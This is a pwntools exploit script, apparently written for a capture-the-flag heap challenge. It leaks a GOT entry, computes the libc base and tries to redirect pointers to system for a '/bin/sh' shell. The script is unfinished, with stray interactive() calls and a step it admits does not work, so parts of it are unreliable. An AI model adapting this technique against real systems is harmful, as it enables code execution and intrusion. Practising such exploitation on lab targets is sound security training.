from pwn import *

context.terminal = ["konsole", "-e"]
context.arch = "amd64"

elf = ELF("./worstcodeever")
if False:
    libc = ELF("libc.so.6")
    p = process(elf.path)
else:
    libc = ELF("libc-2.27.so")
    p = remote("pwn.red.csaw.io", 5008)

func = "puts"


###create dummy friend
p.sendlineafter(b"> ", b"1")
# log.info("bin sh at " + hex(next(libc.search(b"/bin/sh\0"))))
p.sendline(b"1/bin/sh\0\n69")
### create and remove barcode object
p.sendlineafter(b">", b"1\n0\n99\n99")

p.sendlineafter(b">", b"2\n1")

### create and delete name object
p.sendlineafter(b">", b"1\n1\n1")
p.sendlineafter(b">", b"2\n2")

### point barcode to free
free_int_str = str(elf.got[func]).encode()
log.info("free at " + hex(elf.got[func]))

p.sendlineafter(b">", b"4\n1\n" + free_int_str + b"\n99")

### get libc base
p.sendlineafter(b">", b"3\n2")
p.recvuntil(b"Your friend's")
inp = p.recvline()[:-1]
byt = inp.split(b"name: ")[1]
fgets_address = u64(byt.ljust(8, b"\0"))
log.info("free libc address " + hex(fgets_address))
libc.address = fgets_address - libc.symbols[func]
log.info("libc base address " + hex(libc.address))

# ### create fancy thing
# p.sendlineafter(b"> ", b"1")
# log.info("bin sh at " + hex(next(libc.search(b"/bin/sh\0"))))
# p.sendline(b"0" + p64(next(libc.search(b"/bin/sh\0"))))

### point barcode to free
free_int_str = str(elf.symbols["friend_list"] + 0x8).encode()
log.info("free at " + hex(elf.symbols["friend_list"] + 0x8))
p.sendlineafter(b">", b"4\n1\n" + free_int_str + b"\n99")


free_int_str = p64(elf.got["free"])
log.info(b"free at " + free_int_str)
p.interactive()

p.sendlineafter(b">", b"4\n2\n" + free_int_str + b"\n99")
log.info("libc free address " + hex(libc.symbols["free"]))


free_int_str = str(libc.symbols["system"]).encode()
log.info("free at " + hex(libc.symbols["system"]) + str(free_int_str))

p.sendlineafter(b">", b"4\n1\n" + free_int_str + b"\n99")

p.interactive()


### edit name to 'system' address
final_func = "puts"
system_add = p64(libc.symbols[final_func])
log.info("libc system address " + hex(libc.symbols[final_func]))
log.info(system_add)
system_add = system_add[:-2]
if True:
    p.sendlineafter(b">", b"4")
    p.sendline(b"2")
    p.sendline(system_add)  ###note this doesn't work because newline and \n at end
    p.sendline(b"99")
else:
    p.sendlineafter(b">", b"1")
    p.sendline(b"2" + system_add)
    p.sendline(b"2")

p.interactive()
# gdb.attach(p)


### run edit friend on binsh name
# p.sendlineafter(b">", b"4\n0")

